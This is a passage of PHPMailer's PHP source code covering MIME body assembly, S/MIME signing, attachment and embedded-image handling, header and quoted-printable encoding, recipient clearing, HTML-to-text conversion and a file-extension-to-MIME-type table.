                $body .= $this->encodeString($this->Body, $bodyEncoding);
                $body .= $this->LE . $this->LE;
                $body .= $this->attachAll('inline', $this->boundary[3]);
                $body .= $this->LE;
                $body .= $this->endBoundary($this->boundary[2]);
                $body .= $this->LE;
                $body .= $this->attachAll('attachment', $this->boundary[1]);
                break;
            default:
                // catch case 'plain' and case ''
                $body .= $this->encodeString($this->Body, $bodyEncoding);
                break;
        }

        if ($this->isError()) {
            $body = '';
        } elseif ($this->sign_key_file) {
            try {
                if (!defined('PKCS7_TEXT')) {
                    throw new phpmailerException($this->lang('signing') . ' OpenSSL extension missing.');
                }
                // @TODO would be nice to use php://temp streams here, but need to wrap for PHP < 5.1
                $file = tempnam(sys_get_temp_dir(), 'mail');
                if (false === file_put_contents($file, $body)) {
                    throw new phpmailerException($this->lang('signing') . ' Could not write temp file');
                }
                $signed = tempnam(sys_get_temp_dir(), 'signed');
                if (@openssl_pkcs7_sign(
                    $file,
                    $signed,
                    'file://' . realpath($this->sign_cert_file),
                    array('file://' . realpath($this->sign_key_file), $this->sign_key_pass),
                    null
                )
                ) {
                    @unlink($file);
                    $body = file_get_contents($signed);
                    @unlink($signed);
                } else {
                    @unlink($file);
                    @unlink($signed);
                    throw new phpmailerException($this->lang('signing') . openssl_error_string());
                }
            } catch (phpmailerException $exc) {
                $body = '';
                if ($this->exceptions) {
                    throw $exc;
                }
            }
        }
        return $body;
    }

    /**
     * Return the start of a message boundary.
     * @access protected
     * @param string $boundary
     * @param string $charSet
     * @param string $contentType
     * @param string $encoding
     * @return string
     */
    protected function getBoundary($boundary, $charSet, $contentType, $encoding)
    {
        $result = '';
        if ($charSet == '') {
            $charSet = $this->CharSet;
        }
        if ($contentType == '') {
            $contentType = $this->ContentType;
        }
        if ($encoding == '') {
            $encoding = $this->Encoding;
        }
        $result .= $this->textLine('--' . $boundary);
        $result .= sprintf('Content-Type: %s; charset=%s', $contentType, $charSet);
        $result .= $this->LE;
        // RFC1341 part 5 says 7bit is assumed if not specified
        if ($encoding != '7bit') {
            $result .= $this->headerLine('Content-Transfer-Encoding', $encoding);
        }
        $result .= $this->LE;

        return $result;
    }

    /**
     * Return the end of a message boundary.
     * @access protected
     * @param string $boundary
     * @return string
     */
    protected function endBoundary($boundary)
    {
        return $this->LE . '--' . $boundary . '--' . $this->LE;
    }

    /**
     * Set the message type.
     * PHPMailer only supports some preset message types,
     * not arbitrary MIME structures.
     * @access protected
     * @return void
     */
    protected function setMessageType()
    {
        $type = array();
        if ($this->alternativeExists()) {
            $type[] = 'alt';
        }
        if ($this->inlineImageExists()) {
            $type[] = 'inline';
        }
        if ($this->attachmentExists()) {
            $type[] = 'attach';
        }
        $this->message_type = implode('_', $type);
        if ($this->message_type == '') {
            $this->message_type = 'plain';
        }
    }

    /**
     * Format a header line.
     * @access public
     * @param string $name
     * @param string $value
     * @return string
     */
    public function headerLine($name, $value)
    {
        return $name . ': ' . $value . $this->LE;
    }

    /**
     * Return a formatted mail line.
     * @access public
     * @param string $value
     * @return string
     */
    public function textLine($value)
    {
        return $value . $this->LE;
    }

    /**
     * Add an attachment from a path on the filesystem.
     * Returns false if the file could not be found or read.
     * @param string $path Path to the attachment.
     * @param string $name Overrides the attachment name.
     * @param string $encoding File encoding (see $Encoding).
     * @param string $type File extension (MIME) type.
     * @param string $disposition Disposition to use
     * @throws phpmailerException
     * @return boolean
     */
    public function addAttachment($path, $name = '', $encoding = 'base64', $type = '', $disposition = 'attachment')
    {
        try {
            if (!@is_file($path)) {
                throw new phpmailerException($this->lang('file_access') . $path, self::STOP_CONTINUE);
            }

            // If a MIME type is not specified, try to work it out from the file name
            if ($type == '') {
                $type = self::filenameToType($path);
            }

            $filename = basename($path);
            if ($name == '') {
                $name = $filename;
            }

            $this->attachment[] = array(
                0 => $path,
                1 => $filename,
                2 => $name,
                3 => $encoding,
                4 => $type,
                5 => false, // isStringAttachment
                6 => $disposition,
                7 => 0
            );

        } catch (phpmailerException $exc) {
            $this->setError($exc->getMessage());
            $this->edebug($exc->getMessage());
            if ($this->exceptions) {
                throw $exc;
            }
            return false;
        }
        return true;
    }

    /**
     * Return the array of attachments.
     * @return array
     */
    public function getAttachments()
    {
        return $this->attachment;
    }

    /**
     * Attach all file, string, and binary attachments to the message.
     * Returns an empty string on failure.
     * @access protected
     * @param string $disposition_type
     * @param string $boundary
     * @return string
     */
    protected function attachAll($disposition_type, $boundary)
    {
        // Return text of body
        $mime = array();
        $cidUniq = array();
        $incl = array();

        // Add all attachments
        foreach ($this->attachment as $attachment) {
            // Check if it is a valid disposition_filter
            if ($attachment[6] == $disposition_type) {
                // Check for string attachment
                $string = '';
                $path = '';
                $bString = $attachment[5];
                if ($bString) {
                    $string = $attachment[0];
                } else {
                    $path = $attachment[0];
                }

                $inclhash = md5(serialize($attachment));
                if (in_array($inclhash, $incl)) {
                    continue;
                }
                $incl[] = $inclhash;
                $name = $attachment[2];
                $encoding = $attachment[3];
                $type = $attachment[4];
                $disposition = $attachment[6];
                $cid = $attachment[7];
                if ($disposition == 'inline' && isset($cidUniq[$cid])) {
                    continue;
                }
                $cidUniq[$cid] = true;

                $mime[] = sprintf('--%s%s', $boundary, $this->LE);
                $mime[] = sprintf(
                    'Content-Type: %s; name="%s"%s',
                    $type,
                    $this->encodeHeader($this->secureHeader($name)),
                    $this->LE
                );
                // RFC1341 part 5 says 7bit is assumed if not specified
                if ($encoding != '7bit') {
                    $mime[] = sprintf('Content-Transfer-Encoding: %s%s', $encoding, $this->LE);
                }

                if ($disposition == 'inline') {
                    $mime[] = sprintf('Content-ID: <%s>%s', $cid, $this->LE);
                }

                // If a filename contains any of these chars, it should be quoted,
                // but not otherwise: RFC2183 & RFC2045 5.1
                // Fixes a warning in IETF's msglint MIME checker
                // Allow for bypassing the Content-Disposition header totally
                if (!(empty($disposition))) {
                    $encoded_name = $this->encodeHeader($this->secureHeader($name));
                    if (preg_match('/[ \(\)<>@,;:\\"\/\[\]\?=]/', $encoded_name)) {
                        $mime[] = sprintf(
                            'Content-Disposition: %s; filename="%s"%s',
                            $disposition,
                            $encoded_name,
                            $this->LE . $this->LE
                        );
                    } else {
                        $mime[] = sprintf(
                            'Content-Disposition: %s; filename=%s%s',
                            $disposition,
                            $encoded_name,
                            $this->LE . $this->LE
                        );
                    }
                } else {
                    $mime[] = $this->LE;
                }

                // Encode as string attachment
                if ($bString) {
                    $mime[] = $this->encodeString($string, $encoding);
                    if ($this->isError()) {
                        return '';
                    }
                    $mime[] = $this->LE . $this->LE;
                } else {
                    $mime[] = $this->encodeFile($path, $encoding);
                    if ($this->isError()) {
                        return '';
                    }
                    $mime[] = $this->LE . $this->LE;
                }
            }
        }

        $mime[] = sprintf('--%s--%s', $boundary, $this->LE);

        return implode('', $mime);
    }

    /**
     * Encode a file attachment in requested format.
     * Returns an empty string on failure.
     * @param string $path The full path to the file
     * @param string $encoding The encoding to use; one of 'base64', '7bit', '8bit', 'binary', 'quoted-printable'
     * @throws phpmailerException
     * @see EncodeFile(encodeFile
     * @access protected
     * @return string
     */
    protected function encodeFile($path, $encoding = 'base64')
    {
        try {
            if (!is_readable($path)) {
                throw new phpmailerException($this->lang('file_open') . $path, self::STOP_CONTINUE);
            }
            $magic_quotes = get_magic_quotes_runtime();
            if ($magic_quotes) {
                if (version_compare(PHP_VERSION, '5.3.0', '<')) {
                    set_magic_quotes_runtime(false);
                } else {
                    //Doesn't exist in PHP 5.4, but we don't need to check because
                    //get_magic_quotes_runtime always returns false in 5.4+
                    //so it will never get here
                    ini_set('magic_quotes_runtime', 0);
                }
            }
            $file_buffer = file_get_contents($path);
            $file_buffer = $this->encodeString($file_buffer, $encoding);
            if ($magic_quotes) {
                if (version_compare(PHP_VERSION, '5.3.0', '<')) {
                    set_magic_quotes_runtime($magic_quotes);
                } else {
                    ini_set('magic_quotes_runtime', ($magic_quotes?'1':'0'));
                }
            }
            return $file_buffer;
        } catch (Exception $exc) {
            $this->setError($exc->getMessage());
            return '';
        }
    }

    /**
     * Encode a string in requested format.
     * Returns an empty string on failure.
     * @param string $str The text to encode
     * @param string $encoding The encoding to use; one of 'base64', '7bit', '8bit', 'binary', 'quoted-printable'
     * @access public
     * @return string
     */
    public function encodeString($str, $encoding = 'base64')
    {
        $encoded = '';
        switch (strtolower($encoding)) {
            case 'base64':
                $encoded = chunk_split(base64_encode($str), 76, $this->LE);
                break;
            case '7bit':
            case '8bit':
                $encoded = $this->fixEOL($str);
                // Make sure it ends with a line break
                if (substr($encoded, -(strlen($this->LE))) != $this->LE) {
                    $encoded .= $this->LE;
                }
                break;
            case 'binary':
                $encoded = $str;
                break;
            case 'quoted-printable':
                $encoded = $this->encodeQP($str);
                break;
            default:
                $this->setError($this->lang('encoding') . $encoding);
                break;
        }
        return $encoded;
    }

    /**
     * Encode a header string optimally.
     * Picks shortest of Q, B, quoted-printable or none.
     * @access public
     * @param string $str
     * @param string $position
     * @return string
     */
    public function encodeHeader($str, $position = 'text')
    {
        $matchcount = 0;
        switch (strtolower($position)) {
            case 'phrase':
                if (!preg_match('/[\200-\377]/', $str)) {
                    // Can't use addslashes as we don't know the value of magic_quotes_sybase
                    $encoded = addcslashes($str, "\0..\37\177\\\"");
                    if (($str == $encoded) && !preg_match('/[^A-Za-z0-9!#$%&\'*+\/=?^_`{|}~ -]/', $str)) {
                        return ($encoded);
                    } else {
                        return ("\"$encoded\"");
                    }
                }
                $matchcount = preg_match_all('/[^\040\041\043-\133\135-\176]/', $str, $matches);
                break;
            /** @noinspection PhpMissingBreakStatementInspection */
            case 'comment':
                $matchcount = preg_match_all('/[()"]/', $str, $matches);
                // Intentional fall-through
            case 'text':
            default:
                $matchcount += preg_match_all('/[\000-\010\013\014\016-\037\177-\377]/', $str, $matches);
                break;
        }

        if ($matchcount == 0) { // There are no chars that need encoding
            return ($str);
        }

        $maxlen = 75 - 7 - strlen($this->CharSet);
        // Try to select the encoding which should produce the shortest output
        if ($matchcount > strlen($str) / 3) {
            // More than a third of the content will need encoding, so B encoding will be most efficient
            $encoding = 'B';
            if (function_exists('mb_strlen') && $this->hasMultiBytes($str)) {
                // Use a custom function which correctly encodes and wraps long
                // multibyte strings without breaking lines within a character
                $encoded = $this->base64EncodeWrapMB($str, "\n");
            } else {
                $encoded = base64_encode($str);
                $maxlen -= $maxlen % 4;
                $encoded = trim(chunk_split($encoded, $maxlen, "\n"));
            }
        } else {
            $encoding = 'Q';
            $encoded = $this->encodeQ($str, $position);
            $encoded = $this->wrapText($encoded, $maxlen, true);
            $encoded = str_replace('=' . self::CRLF, "\n", trim($encoded));
        }

        $encoded = preg_replace('/^(.*)$/m', ' =?' . $this->CharSet . "?$encoding?\\1?=", $encoded);
        $encoded = trim(str_replace("\n", $this->LE, $encoded));

        return $encoded;
    }

    /**
     * Check if a string contains multi-byte characters.
     * @access public
     * @param string $str multi-byte text to wrap encode
     * @return boolean
     */
    public function hasMultiBytes($str)
    {
        if (function_exists('mb_strlen')) {
            return (strlen($str) > mb_strlen($str, $this->CharSet));
        } else { // Assume no multibytes (we can't handle without mbstring functions anyway)
            return false;
        }
    }

    /**
     * Does a string contain any 8-bit chars (in any charset)?
     * @param string $text
     * @return boolean
     */
    public function has8bitChars($text)
    {
        return (boolean)preg_match('/[\x80-\xFF]/', $text);
    }

    /**
     * Encode and wrap long multibyte strings for mail headers
     * without breaking lines within a character.
     * Adapted from a function by paravoid
     * @link http://www.php.net/manual/en/function.mb-encode-mimeheader.php#60283
     * @access public
     * @param string $str multi-byte text to wrap encode
     * @param string $linebreak string to use as linefeed/end-of-line
     * @return string
     */
    public function base64EncodeWrapMB($str, $linebreak = null)
    {
        $start = '=?' . $this->CharSet . '?B?';
        $end = '?=';
        $encoded = '';
        if ($linebreak === null) {
            $linebreak = $this->LE;
        }

        $mb_length = mb_strlen($str, $this->CharSet);
        // Each line must have length <= 75, including $start and $end
        $length = 75 - strlen($start) - strlen($end);
        // Average multi-byte ratio
        $ratio = $mb_length / strlen($str);
        // Base64 has a 4:3 ratio
        $avgLength = floor($length * $ratio * .75);

        for ($i = 0; $i < $mb_length; $i += $offset) {
            $lookBack = 0;
            do {
                $offset = $avgLength - $lookBack;
                $chunk = mb_substr($str, $i, $offset, $this->CharSet);
                $chunk = base64_encode($chunk);
                $lookBack++;
            } while (strlen($chunk) > $length);
            $encoded .= $chunk . $linebreak;
        }

        // Chomp the last linefeed
        $encoded = substr($encoded, 0, -strlen($linebreak));
        return $encoded;
    }

    /**
     * Encode a string in quoted-printable format.
     * According to RFC2045 section 6.7.
     * @access public
     * @param string $string The text to encode
     * @param integer $line_max Number of chars allowed on a line before wrapping
     * @return string
     * @link http://www.php.net/manual/en/function.quoted-printable-decode.php#89417 Adapted from this comment
     */
    public function encodeQP($string, $line_max = 76)
    {
        if (function_exists('quoted_printable_encode')) { // Use native function if it's available (>= PHP5.3)
            return $this->fixEOL(quoted_printable_encode($string));
        }
        // Fall back to a pure PHP implementation
        $string = str_replace(
            array('%20', '%0D%0A.', '%0D%0A', '%'),
            array(' ', "\r\n=2E", "\r\n", '='),
            rawurlencode($string)
        );
        $string = preg_replace('/[^\r\n]{' . ($line_max - 3) . '}[^=\r\n]{2}/', "$0=\r\n", $string);
        return $this->fixEOL($string);
    }

    /**
     * Backward compatibility wrapper for an old QP encoding function that was removed.
     * @see PHPMailer::encodeQP()
     * @access public
     * @param string $string
     * @param integer $line_max
     * @param boolean $space_conv
     * @return string
     * @deprecated Use encodeQP instead.
     */
    public function encodeQPphp(
        $string,
        $line_max = 76,
        /** @noinspection PhpUnusedParameterInspection */ $space_conv = false
    ) {
        return $this->encodeQP($string, $line_max);
    }

    /**
     * Encode a string using Q encoding.
     * @link http://tools.ietf.org/html/rfc2047
     * @param string $str the text to encode
     * @param string $position Where the text is going to be used, see the RFC for what that means
     * @access public
     * @return string
     */
    public function encodeQ($str, $position = 'text')
    {
        // There should not be any EOL in the string
        $pattern = '';
        $encoded = str_replace(array("\r", "\n"), '', $str);
        switch (strtolower($position)) {
            case 'phrase':
                // RFC 2047 section 5.3
                $pattern = '^A-Za-z0-9!*+\/ -';
                break;
            /** @noinspection PhpMissingBreakStatementInspection */
            case 'comment':
                // RFC 2047 section 5.2
                $pattern = '\(\)"';
                // intentional fall-through
                // for this reason we build the $pattern without including delimiters and []
            case 'text':
            default:
                // RFC 2047 section 5.1
                // Replace every high ascii, control, =, ? and _ characters
                $pattern = '\000-\011\013\014\016-\037\075\077\137\177-\377' . $pattern;
                break;
        }
        $matches = array();
        if (preg_match_all("/[{$pattern}]/", $encoded, $matches)) {
            // If the string contains an '=', make sure it's the first thing we replace
            // so as to avoid double-encoding
            $eqkey = array_search('=', $matches[0]);
            if (false !== $eqkey) {
                unset($matches[0][$eqkey]);
                array_unshift($matches[0], '=');
            }
            foreach (array_unique($matches[0]) as $char) {
                $encoded = str_replace($char, '=' . sprintf('%02X', ord($char)), $encoded);
            }
        }
        // Replace every spaces to _ (more readable than =20)
        return str_replace(' ', '_', $encoded);
    }


    /**
     * Add a string or binary attachment (non-filesystem).
     * This method can be used to attach ascii or binary data,
     * such as a BLOB record from a database.
     * @param string $string String attachment data.
     * @param string $filename Name of the attachment.
     * @param string $encoding File encoding (see $Encoding).
     * @param string $type File extension (MIME) type.
     * @param string $disposition Disposition to use
     * @return void
     */
    public function addStringAttachment(
        $string,
        $filename,
        $encoding = 'base64',
        $type = '',
        $disposition = 'attachment'
    ) {
        // If a MIME type is not specified, try to work it out from the file name
        if ($type == '') {
            $type = self::filenameToType($filename);
        }
        // Append to $attachment array
        $this->attachment[] = array(
            0 => $string,
            1 => $filename,
            2 => basename($filename),
            3 => $encoding,
            4 => $type,
            5 => true, // isStringAttachment
            6 => $disposition,
            7 => 0
        );
    }

    /**
     * Add an embedded (inline) attachment from a file.
     * This can include images, sounds, and just about any other document type.
     * These differ from 'regular' attachments in that they are intended to be
     * displayed inline with the message, not just attached for download.
     * This is used in HTML messages that embed the images
     * the HTML refers to using the $cid value.
     * @param string $path Path to the attachment.
     * @param string $cid Content ID of the attachment; Use this to reference
     *        the content when using an embedded image in HTML.
     * @param string $name Overrides the attachment name.
     * @param string $encoding File encoding (see $Encoding).
     * @param string $type File MIME type.
     * @param string $disposition Disposition to use
     * @return boolean True on successfully adding an attachment
     */
    public function addEmbeddedImage($path, $cid, $name = '', $encoding = 'base64', $type = '', $disposition = 'inline')
    {
        if (!@is_file($path)) {
            $this->setError($this->lang('file_access') . $path);
            return false;
        }

        // If a MIME type is not specified, try to work it out from the file name
        if ($type == '') {
            $type = self::filenameToType($path);
        }

        $filename = basename($path);
        if ($name == '') {
            $name = $filename;
        }

        // Append to $attachment array
        $this->attachment[] = array(
            0 => $path,
            1 => $filename,
            2 => $name,
            3 => $encoding,
            4 => $type,
            5 => false, // isStringAttachment
            6 => $disposition,
            7 => $cid
        );
        return true;
    }

    /**
     * Add an embedded stringified attachment.
     * This can include images, sounds, and just about any other document type.
     * Be sure to set the $type to an image type for images:
     * JPEG images use 'image/jpeg', GIF uses 'image/gif', PNG uses 'image/png'.
     * @param string $string The attachment binary data.
     * @param string $cid Content ID of the attachment; Use this to reference
     *        the content when using an embedded image in HTML.
     * @param string $name
     * @param string $encoding File encoding (see $Encoding).
     * @param string $type MIME type.
     * @param string $disposition Disposition to use
     * @return boolean True on successfully adding an attachment
     */
    public function addStringEmbeddedImage(
        $string,
        $cid,
        $name = '',
        $encoding = 'base64',
        $type = '',
        $disposition = 'inline'
    ) {
        // If a MIME type is not specified, try to work it out from the name
        if ($type == '') {
            $type = self::filenameToType($name);
        }

        // Append to $attachment array
        $this->attachment[] = array(
            0 => $string,
            1 => $name,
            2 => $name,
            3 => $encoding,
            4 => $type,
            5 => true, // isStringAttachment
            6 => $disposition,
            7 => $cid
        );
        return true;
    }

    /**
     * Check if an inline attachment is present.
     * @access public
     * @return boolean
     */
    public function inlineImageExists()
    {
        foreach ($this->attachment as $attachment) {
            if ($attachment[6] == 'inline') {
                return true;
            }
        }
        return false;
    }

    /**
     * Check if an attachment (non-inline) is present.
     * @return boolean
     */
    public function attachmentExists()
    {
        foreach ($this->attachment as $attachment) {
            if ($attachment[6] == 'attachment') {
                return true;
            }
        }
        return false;
    }

    /**
     * Check if this message has an alternative body set.
     * @return boolean
     */
    public function alternativeExists()
    {
        return !empty($this->AltBody);
    }

    /**
     * Clear all To recipients.
     * @return void
     */
    public function clearAddresses()
    {
        foreach ($this->to as $to) {
            unset($this->all_recipients[strtolower($to[0])]);
        }
        $this->to = array();
    }

    /**
     * Clear all CC recipients.
     * @return void
     */
    public function clearCCs()
    {
        foreach ($this->cc as $cc) {
            unset($this->all_recipients[strtolower($cc[0])]);
        }
        $this->cc = array();
    }

    /**
     * Clear all BCC recipients.
     * @return void
     */
    public function clearBCCs()
    {
        foreach ($this->bcc as $bcc) {
            unset($this->all_recipients[strtolower($bcc[0])]);
        }
        $this->bcc = array();
    }

    /**
     * Clear all ReplyTo recipients.
     * @return void
     */
    public function clearReplyTos()
    {
        $this->ReplyTo = array();
    }

    /**
     * Clear all recipient types.
     * @return void
     */
    public function clearAllRecipients()
    {
        $this->to = array();
        $this->cc = array();
        $this->bcc = array();
        $this->all_recipients = array();
    }

    /**
     * Clear all filesystem, string, and binary attachments.
     * @return void
     */
    public function clearAttachments()
    {
        $this->attachment = array();
    }

    /**
     * Clear all custom headers.
     * @return void
     */
    public function clearCustomHeaders()
    {
        $this->CustomHeader = array();
    }

    /**
     * Add an error message to the error container.
     * @access protected
     * @param string $msg
     * @return void
     */
    protected function setError($msg)
    {
        $this->error_count++;
        if ($this->Mailer == 'smtp' and !is_null($this->smtp)) {
            $lasterror = $this->smtp->getError();
            if (!empty($lasterror) and array_key_exists('smtp_msg', $lasterror)) {
                $msg .= '<p>' . $this->lang('smtp_error') . $lasterror['smtp_msg'] . "</p>\n";
            }
        }
        $this->ErrorInfo = $msg;
    }

    /**
     * Return an RFC 822 formatted date.
     * @access public
     * @return string
     * @static
     */
    public static function rfcDate()
    {
        // Set the time zone to whatever the default is to avoid 500 errors
        // Will default to UTC if it's not set properly in php.ini
        date_default_timezone_set(@date_default_timezone_get());
        return date('D, j M Y H:i:s O');
    }

    /**
     * Get the server hostname.
     * Returns 'localhost.localdomain' if unknown.
     * @access protected
     * @return string
     */
    protected function serverHostname()
    {
        $result = 'localhost.localdomain';
        if (!empty($this->Hostname)) {
            $result = $this->Hostname;
        } elseif (isset($_SERVER) and array_key_exists('SERVER_NAME', $_SERVER) and !empty($_SERVER['SERVER_NAME'])) {
            $result = $_SERVER['SERVER_NAME'];
        } elseif (function_exists('gethostname') && gethostname() !== false) {
            $result = gethostname();
        } elseif (php_uname('n') !== false) {
            $result = php_uname('n');
        }
        return $result;
    }

    /**
     * Get an error message in the current language.
     * @access protected
     * @param string $key
     * @return string
     */
    protected function lang($key)
    {
        if (count($this->language) < 1) {
            $this->setLanguage('en'); // set the default language
        }

        if (isset($this->language[$key])) {
            return $this->language[$key];
        } else {
            return 'Language string failed to load: ' . $key;
        }
    }

    /**
     * Check if an error occurred.
     * @access public
     * @return boolean True if an error did occur.
     */
    public function isError()
    {
        return ($this->error_count > 0);
    }

    /**
     * Ensure consistent line endings in a string.
     * Changes every end of line from CRLF, CR or LF to $this->LE.
     * @access public
     * @param string $str String to fixEOL
     * @return string
     */
    public function fixEOL($str)
    {
        // Normalise to \n
        $nstr = str_replace(array("\r\n", "\r"), "\n", $str);
        // Now convert LE as needed
        if ($this->LE !== "\n") {
            $nstr = str_replace("\n", $this->LE, $nstr);
        }
        return $nstr;
    }

    /**
     * Add a custom header.
     * $name value can be overloaded to contain
     * both header name and value (name:value)
     * @access public
     * @param string $name Custom header name
     * @param string $value Header value
     * @return void
     */
    public function addCustomHeader($name, $value = null)
    {
        if ($value === null) {
            // Value passed in as name:value
            $this->CustomHeader[] = explode(':', $name, 2);
        } else {
            $this->CustomHeader[] = array($name, $value);
        }
    }

    /**
     * Create a message from an HTML string.
     * Automatically makes modifications for inline images and backgrounds
     * and creates a plain-text version by converting the HTML.
     * Overwrites any existing values in $this->Body and $this->AltBody
     * @access public
     * @param string $message HTML message string
     * @param string $basedir baseline directory for path
     * @param boolean|callable $advanced Whether to use the internal HTML to text converter
     *    or your own custom converter @see html2text()
     * @return string $message
     */
    public function msgHTML($message, $basedir = '', $advanced = false)
    {
        preg_match_all('/(src|background)=["\'](.*)["\']/Ui', $message, $images);
        if (isset($images[2])) {
            foreach ($images[2] as $imgindex => $url) {
                // Convert data URIs into embedded images
                if (preg_match('#^data:(image[^;,]*)(;base64)?,#', $url, $match)) {
                    $data = substr($url, strpos($url, ','));
                    if ($match[2]) {
                        $data = base64_decode($data);
                    } else {
                        $data = rawurldecode($data);
                    }
                    $cid = md5($url) . '@phpmailer.0'; // RFC2392 S 2
                    if ($this->addStringEmbeddedImage($data, $cid, '', 'base64', $match[1])) {
                        $message = str_replace(
                            $images[0][$imgindex],
                            $images[1][$imgindex] . '="cid:' . $cid . '"',
                            $message
                        );
                    }
                } elseif (!preg_match('#^[A-z]+://#', $url)) {
                    // Do not change urls for absolute images (thanks to corvuscorax)
                    $filename = basename($url);
                    $directory = dirname($url);
                    if ($directory == '.') {
                        $directory = '';
                    }
                    $cid = md5($url) . '@phpmailer.0'; // RFC2392 S 2
                    if (strlen($basedir) > 1 && substr($basedir, -1) != '/') {
                        $basedir .= '/';
                    }
                    if (strlen($directory) > 1 && substr($directory, -1) != '/') {
                        $directory .= '/';
                    }
                    if ($this->addEmbeddedImage(
                        $basedir . $directory . $filename,
                        $cid,
                        $filename,
                        'base64',
                        self::_mime_types((string)self::mb_pathinfo($filename, PATHINFO_EXTENSION))
                    )
                    ) {
                        $message = preg_replace(
                            '/' . $images[1][$imgindex] . '=["\']' . preg_quote($url, '/') . '["\']/Ui',
                            $images[1][$imgindex] . '="cid:' . $cid . '"',
                            $message
                        );
                    }
                }
            }
        }
        $this->isHTML(true);
        // Convert all message body line breaks to CRLF, makes quoted-printable encoding work much better
        $this->Body = $this->normalizeBreaks($message);
        $this->AltBody = $this->normalizeBreaks($this->html2text($message, $advanced));
        if (empty($this->AltBody)) {
            $this->AltBody = 'To view this email message, open it in a program that understands HTML!' .
                self::CRLF . self::CRLF;
        }
        return $this->Body;
    }

    /**
     * Convert an HTML string into plain text.
     * This is used by msgHTML().
     * Note - older versions of this function used a bundled advanced converter
     * which was been removed for license reasons in #232
     * Example usage:
     * <code>
     * // Use default conversion
     * $plain = $mail->html2text($html);
     * // Use your own custom converter
     * $plain = $mail->html2text($html, function($html) {
     *     $converter = new MyHtml2text($html);
     *     return $converter->get_text();
     * });
     * </code>
     * @param string $html The HTML text to convert
     * @param boolean|callable $advanced Any boolean value to use the internal converter,
     *   or provide your own callable for custom conversion.
     * @return string
     */
    public function html2text($html, $advanced = false)
    {
        if (is_callable($advanced)) {
            return call_user_func($advanced, $html);
        }
        return html_entity_decode(
            trim(strip_tags(preg_replace('/<(head|title|style|script)[^>]*>.*?<\/\\1>/si', '', $html))),
            ENT_QUOTES,
            $this->CharSet
        );
    }

    /**
     * Get the MIME type for a file extension.
     * @param string $ext File extension
     * @access public
     * @return string MIME type of file.
     * @static
     */
    public static function _mime_types($ext = '')
    {
        $mimes = array(
            'xl'    => 'application/excel',
            'js'    => 'application/javascript',
            'hqx'   => 'application/mac-binhex40',
            'cpt'   => 'application/mac-compactpro',
            'bin'   => 'application/macbinary',
            'doc'   => 'application/msword',
            'word'  => 'application/msword',
            'class' => 'application/octet-stream',
            'dll'   => 'application/octet-stream',
            'dms'   => 'application/octet-stream',
            'exe'   => 'application/octet-stream',
            'lha'   => 'application/octet-stream',
            'lzh'   => 'application/octet-stream',
            'psd'   => 'application/octet-stream',
            'sea'   => 'application/octet-stream',
            'so'    => 'application/octet-stream',
            'oda'   => 'application/oda',
            'pdf'   => 'application/pdf',
            'ai'    => 'application/postscript',
            'eps'   => 'application/postscript',
            'ps'    => 'application/postscript',
            'smi'   => 'application/smil',
            'smil'  => 'application/smil',
            'mif'   => 'application/vnd.mif',
            'xls'   => 'application/vnd.ms-excel',
            'ppt'   => 'application/vnd.ms-powerpoint',
            'wbxml' => 'application/vnd.wap.wbxml',
            'wmlc'  => 'application/vnd.wap.wmlc',
            'dcr'   => 'application/x-director',
            'dir'   => 'application/x-director',
            'dxr'   => 'application/x-director',
            'dvi'   => 'application/x-dvi',
            'gtar'  => 'application/x-gtar',
            'php3'  => 'application/x-httpd-php',
            'php4'  => 'application/x-httpd-php',
            'php'   => 'application/x-httpd-php',
            'phtml' => 'application/x-httpd-php',
            'phps'  => 'application/x-httpd-php-source',
            'swf'   => 'application/x-shockwave-flash',
            'sit'   => 'application/x-stuffit',
            'tar'   => 'application/x-tar',
            'tgz'   => 'application/x-tar',
            'xht'   => 'application/xhtml+xml',
            'xhtml' => 'application/xhtml+xml',
            'zip'   => 'application/zip',
            'mid'   => 'audio/midi',
            'midi'  => 'audio/midi',
            'mp2'   => 'audio/mpeg',
            'mp3'   => 'audio/mpeg',
            'mpga'  => 'audio/mpeg',
            'aif'   => 'audio/x-aiff',
            'aifc'  => 'audio/x-aiff',
            'aiff'  => 'audio/x-aiff',
            'ram'   => 'audio/x-pn-realaudio',
            'rm'    => 'audio/x-pn-realaudio',
            'rpm'   => 'audio/x-pn-realaudio-plugin',
            'ra'    => 'audio/x-realaudio',
            'wav'   => 'audio/x-wav',
            'bmp'   => 'image/bmp',
            'gif'   => 'image/gif',
            'jpeg'  => 'image/jpeg',
            'jpe'   => 'image/jpeg',
            'jpg'   => 'image/jpeg',
            'png'   => 'image/png',
            'tiff'  => 'image/tiff',
            'tif'   => 'image/tiff',
            'eml'   => 'message/rfc822',
            'css'   => 'text/css',
            'html'  => 'text/html',
            'htm'   => 'text/html',
            'shtml' => 'text/html',
            'log'   => 'text/plain',
            'text'  => 'text/plain',
            'txt'   => 'text/plain',
            'rtx'   => 'text/richtext',
            'rtf'   => 'text/rtf',
            'vcf'   => 'text/vcard',
            'vcard' => 'text/vcard',
            'xml'   => 'text/xml',
            'xsl'   => 'text/xml',
            'mpeg'  => 'video/mpeg',
            'mpe'   => 'video/mpeg',
            'mpg'   => 'video/mpeg',
            'mov'   => 'video/quicktime',
            'qt'    => 'video/quicktime',
            'rv'    => 'video/vnd.rn-realvideo',
            'avi'   => 'video/x-msvideo',
            'movie' => 'video/x-sgi-movie'
        );
        return (array_key_exists(strtolower($ext), $mimes) ? $mimes[strtolower($ext)]: 'application/octet-stream');
    }

    /**
     * Map a file name to a MIME type.
     * Defaults to 'application/octet-stream', i.e.. arbitrary binary data.
     * @param string $filename A file name or full path, does not need to exist as a file
     * @return string
     * @static
     */
    public static function filenameToType($filename)
    {
        // In case the path is a URL, strip any query string before getting extension
        $qpos = strpos($filename, '?');
        if (false !== $qpos) {
            $filename = substr($filename, 0, $qpos);
        }
        $pathinfo = self::mb_pathinfo($filename);
        return self::_mime_types($pathinfo['extension']);
    }

    /**
     * Multi-byte-safe pathinfo replacement.
     * Drop-in replacement for pathinfo(), but multibyte-safe, cross-platform-safe, old-version-safe.
     * Works similarly to the one in PHP >= 5.2.0
     * @link http://www.php.net/manual/en/function.pathinfo.php#107461
     * @param string $path A filename or path, does not need to exist as a file
     * @param integer|string $options Either a PATHINFO_* constant,
     *      or a string name to return only the specified piece, allows 'filename' to work on PHP < 5.2
     * @return string|array
     * @static
     */
    public static function mb_pathinfo($path, $options = null)
    {
        $ret = array('dirname' => '', 'basename' => '', 'extension' => '', 'filename' => '');
        $pathinfo = array();
        if (preg_match('%^(.*?)[\\\\/]*(([^/\\\\]*?)(\.([^\.\\\\/]+?)|))[\\\\/\.]*$%im', $path, $pathinfo)) {
